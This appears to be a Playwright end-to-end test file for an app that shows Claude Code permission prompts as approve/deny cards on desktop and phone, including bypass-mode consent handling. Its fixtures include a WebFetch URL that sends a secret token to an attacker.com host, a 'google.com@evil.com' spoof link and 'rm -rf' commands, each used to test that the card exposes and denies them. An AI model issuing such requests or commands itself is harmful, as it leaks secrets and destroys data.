    await mobile.goto(page.url());
    await expect(card(mobile).locator('.pc-row button')).toHaveText(['Deny', 'Deny with a reason', 'Approve in Terminal']);
    await card(mobile).locator('footer').scrollIntoViewIfNeeded();
    await shot(mobile, 'full-launch-safety-check-phone');
    await watchRunLine(page);
    fake.configure({ holdPrompts: true });
    await answer(page, { choice: 'Deny' });
    expect(await waitFor('the safety check', () => fake.permissions()[asked + 1])).toMatchObject({ outcome: 'denied', mode: 'bypassPermissions' });
    await expect(record(page, 'deny')).toContainText('You chose Deny');
    await page.waitForTimeout(5_000);
    const lines = await runLinesSeen(page);
    expect(lines[0]).toBe('waiting_answer');
    expect(lines).not.toContain('waiting_terminal');
    fake.configure({ holdPrompts: false });
    await expect(card(page).locator('[data-perm-detail]')).toHaveText('rm -rf packages/inbox/build', { timeout: 30_000 });
    await armed(page);
    const hooked = fake.hooks().length;
    const opened = fake.osascript().length;
    await card(page).locator('[data-perm="terminal"]').click();
    expect(await waitFor('the hook ended', () => fake.hooks()[hooked])).toMatchObject({ stdout: '', exitCode: 0 });
    const attach = ((await readThread(page, threadId)) as { attach_command?: string }).attach_command;
    expect(attach).toMatch(new RegExp(`^cd '${world.project.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}' && claude attach [0-9a-f]{8}$`));
    expect((await waitFor('osascript', () => fake.osascript()[opened])).at(-1)).toBe(attach);
    const handed = record(page, 'terminal');
    await expect(handed).toContainText('You chose Approve in Terminal');
    await expect(handed.locator('[data-perm-handoff]')).toHaveText('Approve it in Claude Code within 2 minutes.');
    await expect(pane(page).locator('[data-run="waiting_terminal"]')).toContainText('Claude Code is waiting on a permission prompt', { timeout: 20_000 });
    await expect(handed.locator('[data-perm-open], [data-perm-attach]')).toHaveCount(0);
    await page.mouse.move(0, 0);
    await shot(page, 'approve-in-terminal');
    await mobile.reload();
    await expect(record(mobile, 'terminal')).toContainText('You chose Approve in Terminal');
    await expect(pane(mobile).locator('[data-run="waiting_terminal"] [data-run-attach]')).toBeVisible({ timeout: 20_000 });
    await expect(pane(mobile).locator('[data-run-open], [data-perm-attach]')).toHaveCount(0);
    await shot(mobile, 'approve-in-terminal-phone');
    fake.configure({ localAnswer: await sessionOf(page, threadId) });
    expect(await waitFor('the safety check', () => fake.permissions()[asked + 2])).toMatchObject({ outcome: 'local', mode: 'bypassPermissions' });
    fake.configure({ localAnswer: null });
  } finally {
    writeConfig({ inboxLaunch: { enabled: true, fullPermissions: false } });
    await phone.close();
  }

  const before = fake.permissions().length;
  const next = fake.starts().length;
  fake.configure({ prompts: [BUILD, RM_DIST], safetyBlockMs: 1_500 });
  await launch(page, 'Run the Inbox tests, then switch me to full permissions.');
  const auto = await waitFor('the auto start', () => fake.starts()[next]);
  expect(auto.argv.slice(-3)).toEqual(['--allow-dangerously-skip-permissions', '--permission-mode', 'auto']);
  expect(auto.settings?.permissions?.defaultMode).toBe('default');
  expect(auto.settings?.env?.PLANNOTATOR_LAUNCH_FULL_PERMISSIONS).toBe('1');
  const c = card(page);
  await expect(c.locator('[data-perm-mode="full"]')).toBeEnabled({ timeout: 30_000 });
  await page.mouse.move(0, 0);
  await shot(page, 'full-offered');
  await armed(page);
  await c.locator('[data-perm-mode="full"]').click();
  await expect(c.locator('[data-perm-confirm-full]')).toContainText('Switch this session to Full permissions?');
  await page.waitForTimeout(500);
  expect(fake.permissions().length).toBe(before);
  await c.locator('[data-perm-full-confirm]').click();
  const first = await waitFor('the prompt decided', () => fake.permissions()[before]);
  expect(first.output?.hookSpecificOutput?.decision).toEqual({
    behavior: 'allow',
    updatedInput: BUILD.tool_input,
    updatedPermissions: [{ type: 'setMode', mode: 'bypassPermissions', destination: 'session' }],
  });
  expect(first).toMatchObject({ mode: 'bypassPermissions', modeIgnored: false });
  await expect(record(page, 'full')).toContainText('You chose Allow and switch to Full permissions');
  await expect(card(page).locator('[data-perm-detail]')).toHaveText('rm -rf apps/inbox/dist', { timeout: 30_000 });
  await expect(card(page).locator('.pc-row button')).toHaveText(['Deny', 'Deny with a reason', 'Approve in Terminal']);
  await expect(card(page).locator('[data-perm-mode]')).toHaveCount(0);
  await armed(page);
  await card(page).locator('[data-perm="terminal"]').click();
  const blocked = await waitFor('the safety check', () => fake.permissions()[before + 1]);
  expect(blocked).toMatchObject({ outcome: 'autoblocked', mode: 'bypassPermissions' });
  expect(blocked.output).toBeNull();
  await expect(record(page, 'terminal')).toContainText('You chose Approve in Terminal');
  fake.configure({ safetyBlockMs: undefined });
});

test('an ask rule, not in bypass mode: Allow once is stated as the click and the run line says Claude still waits; Approve in Terminal, offered on every card, hands it to Claude\'s dialog', async () => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  fake.configure({ prompts: [ASK_TOUCH, ASK_TOUCH_2] });
  const { threadId } = await launch(page, 'Touch two files.');
  const c = card(page);
  await expect(c.locator('[data-perm-detail]')).toHaveText('touch allowed.txt', { timeout: 30_000 });
  await expect(c.locator('.pc-row button')).toHaveText(['Allow once', 'Deny', 'Deny with a reason']);
  await expect(c.locator('button.pc-link[data-perm="terminal"]')).toHaveText('Approve in Terminal');
  await page.mouse.move(0, 0);
  await shot(page, 'ask-rule-card');
  const hooked = fake.hooks().length;
  await answer(page, { choice: 'Allow once' });
  await waitFor('the hook answered', () => fake.hooks()[hooked]);
  await expect(record(page, 'once')).toHaveCount(1);
  await expect(record(page, 'once').locator('.pc-rec-verb')).toHaveText('You chose Allow once');
  await expect(pane(page).locator('[data-run="waiting_terminal"]')).toContainText('Claude Code is waiting on a permission prompt', { timeout: 20_000 });
  await page.mouse.move(0, 0);
  await shot(page, 'ask-rule-allow-ignored');
  const settledOf = (command: string) => fake.permissions().slice(before).find((r) => r.input.command === command);
  expect(settledOf('touch allowed.txt')).toBeUndefined();
  fake.configure({ localAnswer: await sessionOf(page, threadId) });
  expect(await waitFor('the first ask', () => settledOf('touch allowed.txt'))).toMatchObject({ outcome: 'local', ignoredAllow: true });
  fake.configure({ localAnswer: null });
  await expect(card(page).locator('[data-perm-detail]')).toHaveText('touch second.txt', { timeout: 30_000 });
  await armed(page);
  const hooked2 = fake.hooks().length;
  const opened = fake.osascript().length;
  await card(page).locator('[data-perm="terminal"]').click();
  expect(await waitFor('the hook ended', () => fake.hooks()[hooked2])).toMatchObject({ stdout: '', exitCode: 0 });
  await waitFor('osascript', () => fake.osascript()[opened]);
  const handed = record(page, 'terminal');
  await expect(handed.locator('.pc-rec-verb')).toHaveText('You chose Approve in Terminal');
  await expect(handed.locator('[data-perm-handoff]')).toHaveText('Approve it in Claude Code, in Terminal.');
  fake.configure({ localAnswer: await sessionOf(page, threadId) });
  expect(await waitFor('the second ask', () => settledOf('touch second.txt'))).toMatchObject({ outcome: 'local', output: null });
  fake.configure({ localAnswer: null });
  expect(world.errors).toEqual([]);
});

test('without the person\'s bypass consent: Full permissions is never offered, the switch on starts in auto mode, and Settings says why', async () => {
  const { page, fake } = world;
  writeConfig({ inboxLaunch: { enabled: true, fullPermissions: true } });
  try {
    const before = fake.permissions().length;
    const next = fake.starts().length;
    fake.configure({ prompts: [BUILD] });
    await launch(page, 'Build the Inbox; no bypass on this computer.');
    const start = await waitFor('the start', () => fake.starts()[next]);
    expect(start.argv.slice(3)).toEqual(['--settings', start.settingsPath!, '--permission-mode', 'auto']);
    expect(start.settings?.env?.CLAUDE_CODE_EVEN_MORE_DANGEROUSLY_SKIP_PERMISSIONS).toBeUndefined();
    expect(start.settings?.env?.PLANNOTATOR_LAUNCH_FULL_PERMISSIONS).toBeUndefined();
    await expect(card(page).locator('[data-perm-mode="auto"]')).toBeVisible({ timeout: 30_000 });
    await expect(card(page).locator('[data-perm-mode="full"]')).toHaveCount(0);
    await expect(pane(page).locator('[data-launched] [data-launch-full]')).toHaveCount(0);
    await answer(page, { choice: 'Allow once' });
    expect((await waitFor('the prompt decided', () => fake.permissions()[before])).outcome).toBe('ran');
    await page.goto(`${world.url}#settings/agents`);
    const row = page.locator('[data-launch-full-row]');
    await expect(row.getByRole('switch', { name: 'Start new sessions with full permissions' })).toHaveAttribute('aria-checked', 'true');
    await expect(row.locator('[data-launch-needs-consent]')).toHaveText(NEEDS_CONSENT);
    await row.scrollIntoViewIfNeeded();
    await shot(page, 'settings-needs-consent');
    claudeSettings(CONSENT);
    await page.reload();
    await expect(row.getByRole('switch')).toHaveAttribute('aria-checked', 'true');
    await expect(row.locator('[data-launch-needs-consent]')).toHaveCount(0);
    claudeSettings({ ...CONSENT, permissions: { disableBypassPermissionsMode: 'disable' } });
    await page.reload();
    await expect(row.locator('[data-launch-bypass-off]')).toHaveText('Bypass mode is turned off in your Claude Code settings, so sessions start without it.');
    await expect(row.locator('[data-launch-needs-consent]')).toHaveCount(0);
    await row.scrollIntoViewIfNeeded();
    await shot(page, 'settings-bypass-off');
  } finally {
    writeConfig({ inboxLaunch: { enabled: true, fullPermissions: false } });
  }
});

test('a second Enter never answers the prompt that arrives right after: the card ignores activation until it has been on screen a moment', async () => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  const first: FakePermissionPrompt = { tool_name: 'Bash', tool_input: { command: 'bun run --cwd apps/inbox build' } };
  const second: FakePermissionPrompt = { tool_name: 'Bash', tool_input: { command: 'rm -rf apps/inbox/dist' } };
  fake.configure({ prompts: [first, second] });
  await launch(page, 'Build the Inbox, then clean its dist folder.');
  await expect(card(page).locator('[data-perm-detail]')).toHaveText('bun run --cwd apps/inbox build', { timeout: 30_000 });
  await page.reload();
  await expect(card(page).locator('[data-perm-detail]')).toHaveText('bun run --cwd apps/inbox build', { timeout: 30_000 });
  await page.waitForTimeout(300);
  await expect(card(page).locator('[data-perm="once"]')).not.toBeFocused();
  await page.evaluate((detail) => {
    const seen = { focusAt: 0, enters: [] as number[] };
    (window as unknown as { __secondPrompt: typeof seen }).__secondPrompt = seen;
    const second = (target: EventTarget | null) =>
      target instanceof HTMLElement && target.matches('[data-perm="once"]') && target.closest('section.pc-card')?.querySelector('[data-perm-detail]')?.textContent === detail;
    document.addEventListener('focusin', (event) => {
      if (second(event.target)) seen.focusAt = Date.now();
    }, true);
    document.addEventListener('keydown', (event) => {
      if (event.key === 'Enter' && second(event.target)) seen.enters.push(Date.now());
    }, true);
  }, 'rm -rf apps/inbox/dist');
  await card(page).locator('[data-perm="once"]').focus();
  await armed(page);
  await page.keyboard.press('Enter');
  const answered = await waitFor('the first prompt decided', () => fake.permissions()[before]);
  expect(answered.output?.hookSpecificOutput?.decision?.behavior).toBe('allow');
  const decidedAt = Date.now();
  await page.waitForFunction(() => (window as unknown as { __secondPrompt: { focusAt: number } }).__secondPrompt.focusAt > 0, null, { timeout: 30_000, polling: 'raf' });
  await page.keyboard.press('Enter');
  await page.keyboard.press('Enter');
  const shownAt = Date.now();
  const pressed = await page.evaluate(() => (window as unknown as { __secondPrompt: { focusAt: number; enters: number[] } }).__secondPrompt);
  expect(pressed.enters).toHaveLength(2);
  const pressedMs = Math.max(...pressed.enters) - pressed.focusAt;
  expect(pressedMs).toBeLessThan(600);
  await expect(card(page).locator('[data-perm-detail]')).toHaveText('rm -rf apps/inbox/dist');
  const arrivedMs = shownAt - decidedAt;
  await page.waitForTimeout(1_200);
  expect(fake.permissions().length).toBe(before + 1);
  await expect(card(page).locator('[data-perm-detail]')).toHaveText('rm -rf apps/inbox/dist');
  await expect(record(page, 'once')).toHaveCount(1);
  test.info().annotations.push({ type: 'timing', description: `second prompt on screen ${arrivedMs} ms after the first answer; Enter pressed ${pressedMs} ms after it took focus` });
  console.log(`TIMING second prompt on screen ${arrivedMs} ms after the first answer; Enter pressed ${pressedMs} ms after it took focus`);
  await answer(page, { choice: 'Deny' });
  expect((await waitFor('the second prompt decided', () => fake.permissions()[before + 1])).output?.hookSpecificOutput?.decision?.behavior).toBe('deny');
});

test('every rule a session choice grants is visible (five rules, desktop and phone), and a crafted link is shown exactly as sent with its real host', async ({ browser }) => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  const rules = ['git add', 'git commit', 'npm run build', 'npm run test', 'python3 -c'];
  const compound: FakePermissionPrompt = {
    tool_name: 'Bash',
    tool_input: { command: "git add -A && git commit -m x && npm run build && npm run test && python3 -c 'print(1)'", description: 'Commit, build, test and print' },
    permission_suggestions: [{ type: 'addRules', rules: rules.map((r) => ({ toolName: 'Bash', ruleContent: `${r}:*` })), behavior: 'allow', destination: 'localSettings' }],
  };
  const raw = `https://${'㎈'.repeat(40)}.attacker.com/collect?k=SECRET_TOKEN_abcdef&user=me`;
  const crafted: FakePermissionPrompt = { tool_name: 'WebFetch', tool_input: { url: raw, prompt: 'Read the page' } };
  const userinfo: FakePermissionPrompt = { tool_name: 'WebFetch', tool_input: { url: 'https://google.com@evil.com/x?q=1', prompt: 'Read the page' } };
  fake.configure({ prompts: [compound, crafted, userinfo] });
  const { threadId } = await launch(page, 'Commit, build and test, then read two pages.');

  const session = card(page).locator('[data-perm="session"]');
  await expect(session).toHaveText('Allow git add, git commit, npm run build, npm run test and python3 -c for this session', { timeout: 30_000 });
  await expect(session.locator('code')).toHaveText(rules);
  expect(await fitsCard(page, '[data-perm="session"]')).toEqual({ inside: true, unclipped: true });
  expect(await session.locator('code').last().evaluate((el) => el.getBoundingClientRect().width > 0)).toBe(true);
  await page.mouse.move(0, 0);
  await shot(page, 'session-rules');
  const phone = await browser.newContext({ viewport: PHONE, deviceScaleFactor: 3, isMobile: true, hasTouch: true, colorScheme: 'light' });
  try {
    const mobile = await phone.newPage();
    await mobile.goto(`${world.url}#thread=${threadId}`);
    const onPhone = card(mobile).locator('[data-perm="session"]');
    await expect(onPhone.locator('code')).toHaveText(rules, { timeout: 30_000 });
    expect(await fitsCard(mobile, '[data-perm="session"]')).toEqual({ inside: true, unclipped: true });
    expect(await oneLine(card(mobile).locator('.pc-head .pc-sub'))).toBe(true);
    await onPhone.scrollIntoViewIfNeeded();
    await shot(mobile, 'session-rules-phone');
  } finally {
    await phone.close();
  }
  await answer(page, { choice: 'Deny' });
  await waitFor('the compound prompt decided', () => fake.permissions()[before]);

  const url = card(page).locator('[data-perm-url]');
  await expect(url).toHaveText(raw, { timeout: 30_000 });
  await expect(url).toContainText('SECRET_TOKEN_abcdef');
  await expect(card(page).locator('[data-perm-host]')).toHaveText(`Host: ${new URL(raw).host}`);
  expect(await fitsCard(page, '[data-perm-url]')).toEqual({ inside: true, unclipped: true });
  await page.mouse.move(0, 0);
  await shot(page, 'long-url');
  await answer(page, { choice: 'Deny' });
  await waitFor('the crafted link decided', () => fake.permissions()[before + 1]);

  await expect(card(page).locator('[data-perm-url]')).toHaveText('https://google.com@evil.com/x?q=1', { timeout: 30_000 });
  await expect(card(page).locator('[data-perm-host]')).toHaveText('Host: evil.com');
  await answer(page, { choice: 'Deny' });
  await waitFor('the user-info link decided', () => fake.permissions()[before + 2]);
});

test('the switch never set and a login shell that runs Claude in bypass mode: with consent the launch starts in bypass mode and no card appears, and Settings follows the shell', async () => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  const starts = fake.starts().length;
  claudeSettings(CONSENT);
  writeConfig({ inboxLaunch: { enabled: true } });
  fake.setLoginExports({ CLAUDE_CODE_EVEN_MORE_DANGEROUSLY_SKIP_PERMISSIONS: '1' });
  try {
    fake.configure({ prompts: [BUILD] });
    const { threadId } = await launch(page, 'Build the Inbox once more.');
    const start = await waitFor('the start', () => fake.starts()[starts]);
    expect(start.argv.slice(-3)).toEqual(['--allow-dangerously-skip-permissions', '--permission-mode', 'bypassPermissions']);
    expect(start.settings?.env?.CLAUDE_CODE_EVEN_MORE_DANGEROUSLY_SKIP_PERMISSIONS).toBeUndefined();
    expect(start.settings?.hooks?.PermissionRequest).toBeDefined();
    const ran = await waitFor('the build run', () => fake.permissions()[before]);
    expect(ran).toMatchObject({ outcome: 'ran', asked: false });
    await expect(pane(page).locator('article.ib-message[data-author="agent"]').last()).toContainText('[Bash ran]', { timeout: 30_000 });
    await expect(pane(page).locator('[data-permission], [data-perm-record]')).toHaveCount(0);
    expect((await readThread(page, threadId)).thread.messages.some((m) => m.author.session?.startsWith('perm:'))).toBe(false);
    await expect(pane(page).locator('[data-launched] [data-launch-full]')).toHaveText('Full permissions');
    await page.goto(`${world.url}#settings/agents`);
    const row = page.locator('[data-launch-full-row]');
    await expect(row.getByRole('switch', { name: 'Start new sessions with full permissions' })).toHaveAttribute('aria-checked', 'true');
    await expect(row.locator('[data-launch-follows="shell"]')).toHaveText("Uses your shell's setting until you change it.");
    await expect(row.locator('[data-launch-needs-consent]')).toHaveCount(0);
    claudeSettings({});
    await page.reload();
    await expect(row.locator('[data-launch-follows="shell"]')).toBeVisible();
    await expect(row.locator('[data-launch-needs-consent]')).toHaveText(NEEDS_CONSENT);
    await row.getByRole('switch').click();
    await expect(row.getByRole('switch')).toHaveAttribute('aria-checked', 'false');
    await expect(row.locator('[data-launch-follows]')).toHaveCount(0);
    await expect(row.locator('[data-launch-needs-consent]')).toHaveCount(0);
    const next = fake.starts().length;
    fake.configure({ prompts: [] });
    await launch(page, 'And once more, in auto mode.');
    expect((await waitFor('the next start', () => fake.starts()[next])).argv.slice(-2)).toEqual(['--permission-mode', 'auto']);
  } finally {
    fake.setLoginExports(null);
    writeConfig({ inboxLaunch: { enabled: true, fullPermissions: false } });
  }
});

test('auto mode refused (a CLI without it), for a person whose own default mode is bypass: started again with no mode and pinned to default mode, so its prompts still come to the card', async () => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  const starts = fake.starts().length;
  claudeSettings({ ...CONSENT, permissions: { defaultMode: 'bypassPermissions' } });
  writeConfig({ inboxLaunch: { enabled: true, fullPermissions: false } });
  fake.configure({ refuseAuto: true, prompts: [BUILD] });
  try {
    await launch(page, 'Build the Inbox, whatever the mode.');
    await expect(card(page).locator('[data-perm-detail]')).toHaveText('bun run --cwd apps/inbox build', { timeout: 30_000 });
    const tried = fake.starts().slice(starts);
    expect(tried.map((s) => s.argv.slice(5))).toEqual([['--allow-dangerously-skip-permissions', '--permission-mode', 'auto'], ['--allow-dangerously-skip-permissions']]);
    expect(tried.map((s) => s.settings?.permissions?.defaultMode)).toEqual(['default', 'default']);
    await answer(page, { choice: 'Allow once' });
    expect(await waitFor('the prompt decided', () => fake.permissions()[before])).toMatchObject({ outcome: 'ran', mode: 'default' });
  } finally {
    fake.configure({ refuseAuto: false });
  }
});

test('a person whose Claude settings set a default mode: no permission mode on argv (never forced to auto, before the shell\'s export), and its prompts still come to the card', async () => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  const starts = fake.starts().length;
  claudeSettings({ ...CONSENT, permissions: { defaultMode: 'acceptEdits' } });
  writeConfig({ inboxLaunch: { enabled: true } });
  fake.setLoginExports({ CLAUDE_CODE_EVEN_MORE_DANGEROUSLY_SKIP_PERMISSIONS: '1' });
  try {
    fake.configure({ prompts: [BUILD] });
    await launch(page, 'Build the Inbox in my usual mode.');
    const start = await waitFor('the start', () => fake.starts()[starts]);
    expect(start.argv.slice(3)).toEqual(['--settings', start.settingsPath!, '--allow-dangerously-skip-permissions']);
    expect(start.settings?.env?.CLAUDE_CODE_EVEN_MORE_DANGEROUSLY_SKIP_PERMISSIONS).toBeUndefined();
    await expect(card(page).locator('[data-perm-detail]')).toHaveText('bun run --cwd apps/inbox build', { timeout: 30_000 });
    await answer(page, { choice: 'Allow once' });
    expect(await waitFor('the prompt decided', () => fake.permissions()[before])).toMatchObject({ outcome: 'ran', mode: 'acceptEdits' });
    await page.goto(`${world.url}#settings/agents`);
    const row = page.locator('[data-launch-full-row]');
    await expect(row.getByRole('switch', { name: 'Start new sessions with full permissions' })).toHaveAttribute('aria-checked', 'false');
    await expect(row).toContainText('Your default mode');
  } finally {
    fake.setLoginExports(null);
    writeConfig({ inboxLaunch: { enabled: true, fullPermissions: false } });
  }
});
